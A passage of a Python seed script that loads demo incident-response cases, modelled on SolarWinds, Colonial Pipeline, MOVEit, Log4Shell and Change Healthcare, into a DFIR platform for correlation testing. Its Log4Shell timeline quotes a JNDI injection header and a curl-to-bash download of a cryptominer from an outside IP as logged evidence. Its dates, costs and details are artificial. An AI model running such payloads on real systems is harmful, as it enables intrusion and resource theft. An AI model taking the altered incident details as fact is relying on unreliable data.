#!/usr/bin/env python3
"""seed_demo_data.py — Inject 7 real-world IR demo incidents into DFIR-FENRIR v2.

Usage:
    # Via Caddy (self-signed cert):
    python scripts/testdata/seed_demo_data.py --url https://localhost --user admin --password <pw> --insecure

    # Direct to backend:
    python scripts/testdata/seed_demo_data.py --url http://localhost:8000 --user admin --password <pw>

NOT idempotent — running twice creates duplicates. Check first: GET /api/incidents

Creates per incident:
  - Incident core (severity, TLP, phase, type, detection method, occurred_at)
  - Affected systems
  - Containment / eradication / recovery actions
  - Timeline events (batch)
  - IOCs (IP, domain, hash with correct v2 type enum)
  - Post-incident lessons (narrative, RCA, contributing factors)
  - Closed status where applicable

Cross-incident IOC overlaps preserved for correlation testing:
  185.220.101.34  — Colonial Pipeline (DarkSide) + MOVEit (Cl0p)
  176.123.2.216   — Colonial Pipeline (DarkSide) + Kaseya (REvil)
  5.252.190.0     — MOVEit (Cl0p) + ProxyLogon (Hafnium)
"""
import argparse
import sys
import urllib3

try:
    import requests
except ImportError:
    print("ERROR: 'requests' is required. Run: pip install requests")
    sys.exit(1)


# ── Auth ──────────────────────────────────────────────────────────────────────

def login(session: "requests.Session", base: str, username: str, password: str) -> None:
    r = session.post(f"{base}/api/auth/login",
                     json={"username": username, "password": password}, timeout=30)
    if r.status_code != 200:
        print(f"Login failed ({r.status_code}): {r.text}")
        sys.exit(1)
    data = r.json()
    if data.get("status") == "totp_required":
        code = input("TOTP code: ").strip()
        r2 = session.post(f"{base}/api/auth/totp/verify", json={"code": code}, timeout=30)
        if r2.status_code != 200:
            print(f"TOTP failed ({r2.status_code}): {r2.text}")
            sys.exit(1)


def api(session: "requests.Session", method: str, base: str, path: str, data=None):
    r = getattr(session, method)(f"{base}{path}", json=data, timeout=30)
    if r.status_code >= 400:
        print(f"  WARN {method.upper()} {path} → {r.status_code}: {r.text[:200]}")
        return None
    return r.json() if r.text else {}


# ── Field helpers ─────────────────────────────────────────────────────────────

_PHASE_MAP = {
    "recovery":      "containment_eradication_recovery",
    "eradication":   "containment_eradication_recovery",
    "containment":   "containment_eradication_recovery",
    "post_incident": "post_incident",
    "detection":     "detection_and_analysis",
}


def v2_phase(p: str) -> str:
    return _PHASE_MAP.get(p, "detection_and_analysis")


def v2_ioc_type(raw_type: str, value: str) -> str:
    if raw_type == "IP":
        return "ip"
    if raw_type == "DOMAIN":
        return "domain"
    if raw_type == "HASH":
        v = value.strip()
        if len(v) == 64:
            return "hash_sha256"
        if len(v) == 40:
            return "hash_sha1"
        if len(v) == 32:
            return "hash_md5"
    return "other"


def utc(dt_str: str) -> str:
    """Append Z if no timezone offset present."""
    if dt_str and not dt_str.endswith("Z") and "+" not in dt_str:
        return dt_str + "Z"
    return dt_str


def split_actions(category: str, text: str) -> list[dict]:
    """Split a paragraph of IR actions into individual RespondAction items."""
    if not text:
        return []
    actions = []
    for i, sentence in enumerate(text.split(". ")):
        sentence = sentence.strip().rstrip(".")
        if not sentence:
            continue
        actions.append({
            "category": category,
            "title": sentence[:512],
            "status": "done",
            "order_index": i,
        })
    return actions


def parse_systems(text: str) -> list[dict]:
    """Parse comma-separated affected-systems string into AffectedSystemCreate list."""
    if not text:
        return []
    out = []
    for part in text.split(","):
        name = part.strip()
        if not name:
            continue
        low = name.lower()
        if any(k in low for k in ["workstation", "ws-", "wkstn", "desktop", "laptop"]):
            st = "workstation"
        elif any(k in low for k in ["database", "sql", " db"]):
            st = "database"
        elif any(k in low for k in ["jenkins", "application", " app"]):
            st = "application"
        elif any(k in low for k in ["vpn", "gateway", "firewall", "citrix", "router"]):
            st = "network_device"
        else:
            st = "server"
        out.append({"name": name, "system_type": st})
    return out


# ── Incident data ─────────────────────────────────────────────────────────────

INCIDENTS = [

    # ── 1. SolarWinds SUNBURST ────────────────────────────────────────────────
    {
        "incident": {
            "title": "SolarWinds SUNBURST — Supply Chain Compromise",
            "description": (
                "Nation-state actor (UNC2452/Cozy Bear) compromised SolarWinds Orion via a "
                "trojanised software update (SUNBURST backdoor). The attacker maintained "
                "persistent access for ~9 months before detection. Lateral movement to mail "
                "servers and identity infrastructure confirmed.\n\n"
                "Financial impact: ~$2.4M in IR costs and system rebuilds. "
                "Exchange mail flow disrupted 48h. SolarWinds monitoring offline 3 weeks. "
                "Email metadata for executive mailboxes accessed; no confirmed exfiltration."
            ),
            "severity": "critical",
            "tlp": "red",
            "incident_type": "supply_chain",
            "detection_method": "external_notification",
            "occurred_at": "2024-03-15T02:30:00Z",
            "phase": "post_incident",
        },
        "patch": {
            "contained_at": "2024-12-14T16:00:00Z",
        },
        "close": True,
        "affected_systems": (
            "SolarWinds Orion Server (SVRORION01), Exchange Server (SVRMAIL01), "
            "Domain Controllers (DC01, DC02), ADFS Server (SVRADFS01)"
        ),
        "containment_actions": (
            "Isolated SolarWinds server from network. "
            "Blocked avsvmcloud[.]com and all identified C2 domains at perimeter firewall. "
            "Disabled SolarWinds Orion service. "
            "Rotated all service accounts and SAML signing certificates."
        ),
        "eradication_actions": (
            "Rebuilt SolarWinds server from clean media. "
            "Rebuilt ADFS server. "
            "Forced password reset for all privileged accounts. "
            "Revoked and reissued all SAML tokens. "
            "Deployed new YARA rules for SUNBURST, TEARDROP, and RAINDROP across all endpoints."
        ),
        "recovery_actions": (
            "Deployed alternative monitoring solution (Zabbix) while SolarWinds was decommissioned. "
            "Restored mail flow after Exchange rebuild. "
            "Verified domain controller integrity with DCDiag and AD replication health checks."
        ),
        "lessons": {
            "incident_narrative": (
                "EXECUTIVE SUMMARY\n"
                "Nation-state actor (UNC2452/Cozy Bear) compromised our SolarWinds Orion server "
                "via a trojanised software update (SUNBURST backdoor). The attacker maintained "
                "persistent access for approximately 9 months before detection. Lateral movement "
                "to mail servers and identity infrastructure confirmed. No evidence of data "
                "exfiltration to external destinations, but internal reconnaissance was extensive.\n\n"
                "TECHNICAL SUMMARY\n"
                "SolarWinds.Orion.Core.BusinessLayer.dll was replaced with a backdoored version "
                "containing the SUNBURST backdoor. The DLL was signed with a valid SolarWinds "
                "certificate. C2 communication used DNS CNAME records to avsvmcloud[.]com, with "
                "HTTP-based C2 as a secondary channel. The attacker used TEARDROP and RAINDROP "
                "loaders for in-memory Cobalt Strike deployment."
            ),
            "root_cause_description": (
                "ATTACK VECTOR: Trojanised software update via compromised SolarWinds build "
                "pipeline (supply chain attack).\n\n"
                "ATTACK CHAIN: Initial Access via Supply Chain Compromise (T1195.002) → Execution "
                "via signed DLL side-loading → C2 via DNS (T1071.004) and HTTP (T1071.001) → "
                "Credential Access via SAML token forging (T1606.002) → Lateral Movement to "
                "Exchange and ADFS."
            ),
            "contributing_factors": [
                "Over-reliance on single monitoring vendor",
                "SolarWinds service account had excessive AD privileges",
                "No application allowlisting on servers",
            ],
            "root_cause_category": "supply_chain",
        },
        "timeline": [
            {
                "event_time": "2024-03-15T02:30:00Z",
                "hostname": "build.solarwinds.com",
                "event_type": "Malware",
                "source": "Threat Intel",
                "description": "Trojanised SolarWinds.Orion.Core.BusinessLayer.dll compiled in SolarWinds build system",
                "mitre_tactic_id": "TA0001", "mitre_tactic_name": "Initial Access",
                "mitre_technique_id": "T1195.002",
                "mitre_technique_name": "Supply Chain Compromise: Compromise Software Supply Chain",
            },
            {
                "event_time": "2024-03-26T14:00:00Z",
                "hostname": "SVRORION01",
                "event_type": "Process",
                "source": "EDR",
                "description": "SolarWinds Orion update installed — backdoored DLL loaded into SolarWinds.BusinessLayerHost.exe",
                "mitre_tactic_id": "TA0002", "mitre_tactic_name": "Execution",
                "mitre_technique_id": "T1072", "mitre_technique_name": "Software Deployment Tools",
            },
            {
                "event_time": "2024-04-02T03:15:00Z",
                "hostname": "SVRORION01",
                "event_type": "Network",
                "source": "DNS logs",
                "description": "DNS query to avsvmcloud[.]com — SUNBURST C2 beacon via encoded DNS CNAME",
                "mitre_tactic_id": "TA0011", "mitre_tactic_name": "Command and Control",
                "mitre_technique_id": "T1071.004",
                "mitre_technique_name": "Application Layer Protocol: DNS",
            },
            {
                "event_time": "2024-06-10T08:45:00Z",
                "hostname": "DC01",
                "event_type": "Lateral Movement",
                "source": "Windows Event Log",
                "description": "Kerberos TGT request using forged SAML token from ADFS — lateral movement to Domain Controller",
                "mitre_tactic_id": "TA0008", "mitre_tactic_name": "Lateral Movement",
                "mitre_technique_id": "T1550.001",
                "mitre_technique_name": "Use Alternate Authentication Material: Application Access Token",
            },
            {
                "event_time": "2024-08-20T11:30:00Z",
                "hostname": "SVRMAIL01",
                "event_type": "Exfiltration",
                "source": "Exchange Audit",
                "description": "Mailbox search performed across C-suite accounts using compromised admin credentials",
                "mitre_tactic_id": "TA0009", "mitre_tactic_name": "Collection",
                "mitre_technique_id": "T1114.002",
                "mitre_technique_name": "Email Collection: Remote Email Collection",
            },
            {
                "event_time": "2024-12-13T09:15:00Z",
                "hostname": "SOC",
                "event_type": "Other",
                "source": "Threat Intel",
                "description": "FireEye notification received — SUNBURST indicators shared under TLP:RED. Immediate triage initiated.",
                "mitre_tactic_id": "TA0043", "mitre_tactic_name": "Reconnaissance",
            },
            {
                "event_time": "2024-12-14T16:00:00Z",
                "hostname": "SVRORION01",
                "event_type": "Containment",
                "source": "IR Team",
                "description": "SolarWinds server isolated. All C2 domains blocked at perimeter. Service accounts rotated.",
            },
        ],
        "iocs": [
            {"type": "domain", "value": "avsvmcloud.com", "notes": "SUNBURST primary C2 domain | Confidence: 100% | Tags: sunburst, c2 | Source: FireEye", "malicious": True, "source": "FireEye"},
            {"type": "domain", "value": "freescanonline.com", "notes": "SUNBURST secondary C2 | Confidence: 95% | Tags: sunburst, c2 | Source: FireEye", "malicious": True, "source": "FireEye"},
            {"type": "domain", "value": "deftsecurity.com", "notes": "SUNBURST secondary C2 | Confidence: 95% | Tags: sunburst, c2 | Source: FireEye", "malicious": True, "source": "FireEye"},
            {"type": "hash_sha256", "value": "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77", "notes": "SUNBURST backdoored DLL (SHA256) | Confidence: 100% | Tags: sunburst, backdoor | Source: Microsoft", "malicious": True, "source": "Microsoft"},
            {"type": "hash_sha256", "value": "d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600", "notes": "TEARDROP loader (SHA256) | Confidence: 100% | Tags: teardrop, loader | Source: FireEye", "malicious": True, "source": "FireEye"},
            {"type": "ip", "value": "13.59.205.66", "notes": "SUNBURST C2 infrastructure | Confidence: 90% | Tags: sunburst, c2 | Source: CISA", "malicious": True, "source": "CISA"},
            {"type": "ip", "value": "54.193.127.66", "notes": "SUNBURST C2 infrastructure | Confidence: 90% | Tags: sunburst, c2 | Source: CISA", "malicious": True, "source": "CISA"},
        ],
    },

    # ── 2. Colonial Pipeline — DarkSide Ransomware ────────────────────────────
    {
        "incident": {
            "title": "Colonial Pipeline — DarkSide Ransomware",
            "description": (
                "DarkSide ransomware-as-a-service affiliate gained access via compromised VPN "
                "credentials (legacy account, no MFA) and deployed ransomware across IT systems, "
                "forcing shutdown of the largest fuel pipeline in the US.\n\n"
                "Financial impact: ~$4.4M ransom paid + ~$12M operational losses during shutdown. "
                "Pipeline offline 6 days. 100GB data exfiltrated prior to encryption (double extortion). "
                "No segmentation between IT and OT — SCADA taken offline as precaution."
            ),
            "severity": "critical",
            "tlp": "amber",
            "incident_type": "ransomware",
            "detection_method": "user_report",
            "occurred_at": "2025-05-02T04:12:00Z",
            "phase": "containment_eradication_recovery",
        },
        "patch": {
            "contained_at": "2025-05-07T18:00:00Z",
        },
        "close": False,
        "affected_systems": (
            "VPN Gateway (VPNGW01), File Servers (FS01), File Servers (FS02), "
            "File Servers (FS03), File Servers (FS04), Billing System (BILSRV01), "
            "Active Directory (DC01)"
        ),
        "containment_actions": (
            "Disabled all VPN access. "
            "Isolated affected file servers. "
            "Blocked DarkSide C2 domains and IPs at perimeter. "
            "Shut down pipeline SCADA as precautionary measure."
        ),
        "eradication_actions": "",
        "recovery_actions": "",
        "lessons": {
            "incident_narrative": (
                "EXECUTIVE SUMMARY\n"
                "DarkSide ransomware affiliate compromised our VPN gateway using a legacy account "
                "with no MFA. The attacker moved laterally through the IT network over 5 days "
                "before deploying ransomware. 100GB of data was exfiltrated prior to encryption "
                "for double extortion. Pipeline SCADA systems were not directly impacted but were "
                "taken offline as a precautionary measure."
            ),
            "root_cause_description": (
                "ATTACK VECTOR: Compromised VPN credentials for a legacy account (no MFA, "
                "password reuse from prior breach)."
            ),
            "contributing_factors": [
                "No MFA on VPN",
                "Legacy accounts not decommissioned",
                "Flat network — no segmentation between IT and OT",
            ],
            "root_cause_category": "credential_compromise",
        },
        "timeline": [
            {
                "event_time": "2025-05-02T04:12:00Z",
                "hostname": "VPNGW01",
                "event_type": "Authentication",
                "source": "VPN logs",
                "description": "Successful VPN login from 185.220.101.34 using legacy account 'cpadmin' — no MFA challenge",
                "mitre_tactic_id": "TA0001", "mitre_tactic_name": "Initial Access",
                "mitre_technique_id": "T1078.001",
                "mitre_technique_name": "Valid Accounts: Default Accounts",
            },
            {
                "event_time": "2025-05-03T02:30:00Z",
                "hostname": "DC01",
                "event_type": "Lateral Movement",
                "source": "Windows Event Log",
                "description": "PsExec execution from 10.0.1.50 → DC01 using harvested domain admin credentials",
                "mitre_tactic_id": "TA0008", "mitre_tactic_name": "Lateral Movement",
                "mitre_technique_id": "T1570", "mitre_technique_name": "Lateral Tool Transfer",
            },
            {
                "event_time": "2025-05-04T14:00:00Z",
                "hostname": "FS01",
                "event_type": "Exfiltration",
                "source": "Firewall",
                "description": "Large data transfer (100GB) to external IP 185.220.101.34 via HTTPS — staging for double extortion",
                "mitre_tactic_id": "TA0010", "mitre_tactic_name": "Exfiltration",
                "mitre_technique_id": "T1041",
                "mitre_technique_name": "Exfiltration Over C2 Channel",
            },
            {
                "event_time": "2025-05-07T03:00:00Z",
                "hostname": "FS01",
                "event_type": "Malware",
                "source": "EDR",
                "description": "DarkSide ransomware binary executed — files encrypted with .darkside extension across FS01-FS04",
                "mitre_tactic_id": "TA0040", "mitre_tactic_name": "Impact",
                "mitre_technique_id": "T1486",
                "mitre_technique_name": "Data Encrypted for Impact",
            },
            {
                "event_time": "2025-05-07T05:30:00Z",
                "hostname": "SOC",
                "event_type": "Other",
                "source": "User Report",
                "description": "Operations team reports inability to access billing system and file shares. Ransom note discovered.",
            },
            {
                "event_time": "2025-05-07T18:00:00Z",
                "hostname": "ALL",
                "event_type": "Containment",
                "source": "IR Team",
                "description": "All VPN disabled. Affected segments isolated. Pipeline SCADA shutdown initiated as precaution.",
            },
        ],
        "iocs": [
            {"type": "ip", "value": "185.220.101.34", "notes": "DarkSide affiliate VPN entry point and exfil destination | Confidence: 100% | Tags: darkside, c2, exfiltration | Source: IR Investigation", "malicious": True, "source": "IR Investigation"},
            {"type": "hash_sha256", "value": "bcd2bdea2bfecd09e258b8777e3825c4a1d98af220e1b7b267b4ebda703f7f34", "notes": "DarkSide ransomware binary (SHA256) | Confidence: 100% | Tags: darkside, ransomware | Source: EDR", "malicious": True, "source": "EDR"},
            {"type": "domain", "value": "baroquetees.com", "notes": "DarkSide C2 domain | Confidence: 95% | Tags: darkside, c2 | Source: Mandiant", "malicious": True, "source": "Mandiant"},
            {"type": "ip", "value": "176.123.2.216", "notes": "DarkSide Tor infrastructure | Confidence: 85% | Tags: darkside, tor | Source: CISA", "malicious": True, "source": "CISA"},
            {"type": "hash_sha1", "value": "156335b95ba216456f1ac0894b7b9d6ad7461f7", "notes": "Cobalt Strike beacon DLL (SHA1) | Confidence: 95% | Tags: cobalt-strike, beacon | Source: EDR", "malicious": True, "source": "EDR"},
        ],
    },

    # ── 3. MOVEit Transfer — Cl0p Data Theft ──────────────────────────────────
    {
        "incident": {
            "title": "MOVEit Transfer — Cl0p Mass Data Theft",
            "description": (
                "Cl0p ransomware group exploited a zero-day SQL injection vulnerability "
                "(CVE-2023-34362) in Progress MOVEit Transfer. LEMURLOOT webshell deployed; "
                "47,000 employee records including SSN, DOB, salary, and bank details exfiltrated.\n\n"
                "Regulatory: GDPR Art. 33 notification required within 72h. State breach notification "
                "laws triggered for 12 US states. No ransomware deployed — pure data theft for extortion."
            ),
            "severity": "high",
            "tlp": "amber",
            "incident_type": "data_breach",
            "detection_method": "threat_hunting",
            "occurred_at": "2025-05-27T18:00:00Z",
            "phase": "post_incident",
        },
        "patch": {
            "contained_at": "2025-06-01T14:00:00Z",
        },
        "close": True,
        "affected_systems": (
            "MOVEit Transfer Server (MOVEIT01), SQL Server backend (SQLMOVEIT01)"
        ),
        "containment_actions": (
            "Took MOVEit Transfer server offline immediately upon webshell discovery. "
            "Blocked Cl0p exfiltration IPs at perimeter."
        ),
        "eradication_actions": (
            "Removed LEMURLOOT webshell (human2.aspx) and all related artefacts. "
            "Applied CVE-2023-34362 patch. "
            "Audited all files in MOVEit web directories for additional implants."
        ),
        "recovery_actions": (
            "MOVEit Transfer brought back online after patching and clean-build verification. "
            "WAF rules added to block LEMURLOOT callback patterns. "
            "Data minimisation review initiated — PII no longer stored on transfer server."
        ),
        "lessons": {
            "incident_narrative": (
                "EXECUTIVE SUMMARY\n"
                "Our internet-facing MOVEit Transfer server was compromised via CVE-2023-34362 "
                "(SQL injection → webshell). The Cl0p group exfiltrated employee PII and financial "
                "records for approximately 47,000 individuals before the vulnerability was patched. "
                "No ransomware was deployed — this was pure data theft for extortion.\n\n"
                "TECHNICAL SUMMARY\n"
                "SQL injection in MOVEit Transfer (/moveitisapi/moveitisapi.dll) was used to write "
                "the LEMURLOOT webshell (human2.aspx) to the web directory. Bulk SELECT queries "
                "against the SQL backend exfiltrated 47,000 records via HTTPS POST through the "
                "webshell. Webshell discovered during emergency patching 4 days after initial access."
            ),
            "root_cause_description": (
                "ATTACK VECTOR: SQL injection in MOVEit Transfer web application "
                "(CVE-2023-34362) — zero-day at time of exploitation."
            ),
            "contributing_factors": [
                "MOVEit server exposed directly to internet without WAF",
                "No file integrity monitoring on web directories",
                "Sensitive PII stored in bulk on transfer server",
            ],
            "root_cause_category": "web_attack",
        },
        "timeline": [
            {
                "event_time": "2025-05-27T18:00:00Z",
                "hostname": "MOVEIT01",
                "event_type": "Network",
                "source": "WAF/IDS",
                "description": "SQL injection payload sent to /moveitisapi/moveitisapi.dll — CVE-2023-34362 exploitation",
                "mitre_tactic_id": "TA0001", "mitre_tactic_name": "Initial Access",
                "mitre_technique_id": "T1190",
                "mitre_technique_name": "Exploit Public-Facing Application",
            },
            {
                "event_time": "2025-05-27T18:05:00Z",
                "hostname": "MOVEIT01",
                "event_type": "File System",
                "source": "FIM",
                "description": "LEMURLOOT webshell (human2.aspx) written to C:\\MOVEitTransfer\\wwwroot\\",
                "mitre_tactic_id": "TA0003", "mitre_tactic_name": "Persistence",
                "mitre_technique_id": "T1505.003",
                "mitre_technique_name": "Server Software Component: Web Shell",
            },
            {
                "event_time": "2025-05-28T02:00:00Z",
                "hostname": "SQLMOVEIT01",
                "event_type": "Exfiltration",
                "source": "SQL Audit",
                "description": "Bulk SELECT queries executed against employee_data and payroll tables — 47,000 records accessed",
                "mitre_tactic_id": "TA0009", "mitre_tactic_name": "Collection",
                "mitre_technique_id": "T1005",
                "mitre_technique_name": "Data from Local System",
            },
            {
                "event_time": "2025-05-28T03:00:00Z",
                "hostname": "MOVEIT01",
                "event_type": "Exfiltration",
                "source": "Firewall",
                "description": "Compressed data archive exfiltrated via HTTPS POST through LEMURLOOT webshell to external IP",
                "mitre_tactic_id": "TA0010", "mitre_tactic_name": "Exfiltration",
                "mitre_technique_id": "T1041",
                "mitre_technique_name": "Exfiltration Over C2 Channel",
            },
            {
                "event_time": "2025-06-01T10:30:00Z",
                "hostname": "SOC",
                "event_type": "Other",
                "source": "Manual Discovery",
                "description": "Anomalous human2.aspx file discovered during emergency patching for CVE-2023-34362. Webshell confirmed.",
            },
        ],
        "iocs": [
            {"type": "hash_sha256", "value": "110bf60b6c0e6e6a3a1c1855a2e01e3c041e5f1c1afc1c16e25e408f0db6b0e3", "notes": "LEMURLOOT webshell (human2.aspx) SHA256 | Confidence: 100% | Tags: cl0p, lemurloot, webshell | Source: Mandiant", "malicious": True, "source": "Mandiant"},
            {"type": "ip", "value": "5.252.190.0", "notes": "Cl0p exfiltration infrastructure | Confidence: 90% | Tags: cl0p, exfil | Source: CISA", "malicious": True, "source": "CISA"},
            {"type": "ip", "value": "185.220.101.34", "notes": "Cl0p staging server (shared infra with other groups) | Confidence: 80% | Tags: cl0p, staging | Source: Mandiant", "malicious": True, "source": "Mandiant"},
            {"type": "domain", "value": "movloads.top", "notes": "Cl0p operational domain | Confidence: 90% | Tags: cl0p | Source: Microsoft", "malicious": True, "source": "Microsoft"},
        ],
    },

    # ── 4. Log4Shell — CVE-2021-44228 ────────────────────────────────────────
    {
        "incident": {
            "title": "Log4Shell (CVE-2021-44228) — Active Exploitation",
            "description": (
                "Critical RCE vulnerability in Apache Log4j 2 exploited via JNDI injection "
                "through HTTP headers. Multiple internet-facing Java applications compromised. "
                "Cryptominers deployed on 3 servers; one server showed reverse shell to known "
                "threat actor IP. All vulnerable instances patched or mitigated."
            ),
            "severity": "critical",
            "tlp": "green",
            "incident_type": "vulnerability_exploitation",
            "detection_method": "siem_alert",
            "occurred_at": "2025-12-10T06:00:00Z",
            "phase": "containment_eradication_recovery",
        },
        "patch": {
            "contained_at": "2025-12-10T12:00:00Z",
        },
        "close": False,
        "affected_systems": (
            "Apache Tomcat (WEB01), Apache Tomcat (WEB02), Apache Tomcat (WEB03), "
            "Elasticsearch (ES01), Elasticsearch (ES02), Elasticsearch (ES03), Jenkins CI (JENKINS01)"
        ),
        "containment_actions": (
            "WAF rules deployed to block all JNDI lookup patterns. "
            "Outbound LDAP/RMI traffic blocked at perimeter. "
            "Affected servers isolated for forensic imaging."
        ),
        "eradication_actions": (
            "Removed XMRig cryptominer processes and persistence mechanisms from WEB01–WEB03. "
            "Killed reverse shell sessions from JENKINS01. "
            "Log4j updated to 2.17.1 across all Java applications. "
            "Rebuilt JENKINS01 from clean baseline."
        ),
        "recovery_actions": (
            "WEB01–WEB03 returned to service after patching and clean verification. "
            "JENKINS01 rebuild completed and pipeline access restored. "
            "Dependency inventory completed — Log4j transitive includes catalogued."
        ),
        "lessons": {
            "incident_narrative": (
                "EXECUTIVE SUMMARY\n"
                "Multiple internet-facing Java applications were exploited via Log4Shell "
                "(CVE-2021-44228). Attackers used JNDI/LDAP injection through HTTP headers to "
                "achieve remote code execution. Cryptominers deployed on 3 servers, and one server "
                "showed signs of a reverse shell to a known threat actor IP. All vulnerable "
                "instances identified and either patched or mitigated."
            ),
            "root_cause_description": (
                "ATTACK VECTOR: Remote code execution via JNDI injection in Log4j 2.x "
                "(CVE-2021-44228). Exploited through HTTP request headers logged by Apache Tomcat."
            ),
            "contributing_factors": [
                "No WAF rules for JNDI patterns prior to disclosure",
                "Dependency management did not track transitive Log4j inclusion",
                "Jenkins exposed to internet",
            ],
            "root_cause_category": "vulnerability_exploitation",
        },
        "timeline": [
            {
                "event_time": "2025-12-10T06:00:00Z",
                "hostname": "WEB01",
                "event_type": "Network",
                "source": "WAF",
                "description": "Inbound HTTP request with User-Agent: ${jndi:ldap://45.155.205.233:12344/a} — Log4Shell exploitation attempt",
                "mitre_tactic_id": "TA0001", "mitre_tactic_name": "Initial Access",
                "mitre_technique_id": "T1190",
                "mitre_technique_name": "Exploit Public-Facing Application",
            },
            {
                "event_time": "2025-12-10T06:01:00Z",
                "hostname": "WEB01",
                "event_type": "Process",
                "source": "EDR",
                "description": "java.exe spawned child process: /bin/bash -c 'curl http://45.155.205.233/xmrig | bash'",
                "mitre_tactic_id": "TA0002", "mitre_tactic_name": "Execution",
                "mitre_technique_id": "T1059.004",
                "mitre_technique_name": "Command and Scripting Interpreter: Unix Shell",
            },
            {
                "event_time": "2025-12-10T06:15:00Z",
                "hostname": "WEB02",
                "event_type": "Malware",
                "source": "EDR",
                "description": "XMRig cryptominer process detected — CPU utilisation spike to 100% on all cores",
                "mitre_tactic_id": "TA0040", "mitre_tactic_name": "Impact",
                "mitre_technique_id": "T1496", "mitre_technique_name": "Resource Hijacking",
            },
            {
                "event_time": "2025-12-10T07:00:00Z",
                "hostname": "JENKINS01",
                "event_type": "Network",
                "source": "Firewall",
                "description": "Reverse shell connection established from JENKINS01 to 194.163.163.94:4444",
                "mitre_tactic_id": "TA0011", "mitre_tactic_name": "Command and Control",
                "mitre_technique_id": "T1095",
                "mitre_technique_name": "Non-Application Layer Protocol",
            },
            {
                "event_time": "2025-12-10T08:30:00Z",
                "hostname": "SOC",
                "event_type": "Other",
                "source": "WAF Alert",
                "description": "WAF alerts correlated — mass Log4Shell scanning confirmed. IR team engaged.",
            },
        ],
        "iocs": [
            {"type": "ip", "value": "45.155.205.233", "notes": "Log4Shell exploit delivery + XMRig download server | Confidence: 100% | Tags: log4shell, cryptominer, c2 | Source: WAF", "malicious": True, "source": "WAF"},
            {"type": "ip", "value": "194.163.163.94", "notes": "Reverse shell C2 from Jenkins compromise | Confidence: 100% | Tags: log4shell, c2, reverse-shell | Source: Firewall", "malicious": True, "source": "Firewall"},
            {"type": "domain", "value": "log4j-callback.xyz", "notes": "JNDI callback domain used in spray campaign | Confidence: 85% | Tags: log4shell | Source: Threat Intel", "malicious": True, "source": "Threat Intel"},
            {"type": "hash_sha256", "value": "6ed5a7f06a1ef8e0064e9e3c2cd80d9d3bf1e75f3b4c4f7c0db30e3a6f0a0c7b", "notes": "XMRig cryptominer binary SHA256 | Confidence: 100% | Tags: cryptominer, xmrig | Source: EDR", "malicious": True, "source": "EDR"},
        ],
    },

    # ── 5. Change Healthcare — ALPHV/BlackCat ─────────────────────────────────
    {
        "incident": {
            "title": "Change Healthcare — ALPHV/BlackCat Ransomware",
            "description": (
                "ALPHV/BlackCat affiliate gained access via stolen Citrix credentials (no MFA). "
                "Over 9 days the attacker exfiltrated 6TB of patient PHI before deploying "
                "ransomware. Claims processing offline 21 days affecting 1,500+ downstream "
                "healthcare providers.\n\n"
                "Financial impact: $22M ransom + estimated $1.6B total damages. "
                "Regulatory: HIPAA breach notification required for ~100M individuals; HHS OCR "
                "investigation opened."
            ),
            "severity": "critical",
            "tlp": "red",
            "incident_type": "ransomware",
            "detection_method": "user_report",
            "occurred_at": "2025-02-12T03:00:00Z",
            "phase": "containment_eradication_recovery",
        },
        "patch": {
            "contained_at": "2025-02-22T00:00:00Z",
        },
        "close": False,
        "affected_systems": (
            "Citrix Gateway (CTXGW01), Claims Processing (CLAIMS01), Claims Processing (CLAIMS02), "
            "Claims Processing (CLAIMS03), Patient Database (PATDB01), Backup Server (BKUP01)"
        ),
        "containment_actions": (
            "Disabled all Citrix Gateway access. "
            "Isolated claims processing cluster and patient database. "
            "Blocked ALPHV C2 domains and IPs at perimeter. "
            "Offline backups verified as unaffected."
        ),
        "eradication_actions": (
            "BlackCat/ALPHV ransomware binaries removed from all systems. "
            "All compromised credentials rotated. "
            "Citrix Gateway rebuilt from clean media with MFA enforced."
        ),
        "recovery_actions": (
            "Claims processing restored from offline backups in phased approach. "
            "HIPAA breach notification process initiated. "
            "Network segmentation implemented between Citrix DMZ and claims processing cluster."
        ),
        "lessons": {
            "incident_narrative": (
                "EXECUTIVE SUMMARY\n"
                "ALPHV/BlackCat affiliate gained access to our Citrix remote access portal using "
                "stolen credentials (no MFA). Over 9 days the attacker exfiltrated 6TB of patient "
                "data including PHI, PII, and insurance claims before deploying ransomware. Claims "
                "processing systems were offline for 3 weeks affecting 1,500+ downstream healthcare "
                "providers."
            ),
            "root_cause_description": (
                "ATTACK VECTOR: Stolen credentials used to authenticate to Citrix Gateway "
                "(no MFA enforced on remote access)."
            ),
            "contributing_factors": [
                "No MFA on Citrix Gateway",
                "Flat network between IT and claims processing",
                "Backups accessible from compromised network",
                "No data loss prevention on egress",
            ],
            "root_cause_category": "credential_compromise",
        },
        "timeline": [
            {
                "event_time": "2025-02-12T03:00:00Z",
                "hostname": "CTXGW01",
                "event_type": "Authentication",
                "source": "Citrix Logs",
                "description": "Successful Citrix login from 89.187.185.171 using compromised service account — no MFA challenge",
                "mitre_tactic_id": "TA0001", "mitre_tactic_name": "Initial Access",
                "mitre_technique_id": "T1078", "mitre_technique_name": "Valid Accounts",
            },
            {
                "event_time": "2025-02-14T22:00:00Z",
                "hostname": "PATDB01",
                "event_type": "Lateral Movement",
                "source": "SQL Audit",
                "description": "Bulk data access to patient records database — 6TB of PHI staged for exfiltration",
                "mitre_tactic_id": "TA0009", "mitre_tactic_name": "Collection",
                "mitre_technique_id": "T1530",
                "mitre_technique_name": "Data from Cloud Storage",
            },
            {
                "event_time": "2025-02-17T01:00:00Z",
                "hostname": "CLAIMS01",
                "event_type": "Exfiltration",
                "source": "Firewall",
                "description": "Sustained HTTPS data transfer to external IP over 72 hours — 6TB total exfiltrated",
                "mitre_tactic_id": "TA0010", "mitre_tactic_name": "Exfiltration",
                "mitre_technique_id": "T1048.001",
                "mitre_technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
            },
            {
                "event_time": "2025-02-21T04:00:00Z",
                "hostname": "CLAIMS01",
                "event_type": "Malware",
                "source": "EDR",
                "description": "BlackCat/ALPHV ransomware deployed across claims processing cluster — all 12 servers encrypted simultaneously",
                "mitre_tactic_id": "TA0040", "mitre_tactic_name": "Impact",
                "mitre_technique_id": "T1486",
                "mitre_technique_name": "Data Encrypted for Impact",
            },
        ],
        "iocs": [
            {"type": "ip", "value": "89.187.185.171", "notes": "ALPHV affiliate initial access IP | Confidence: 100% | Tags: alphv, blackcat, initial-access | Source: Citrix Logs", "malicious": True, "source": "Citrix Logs"},
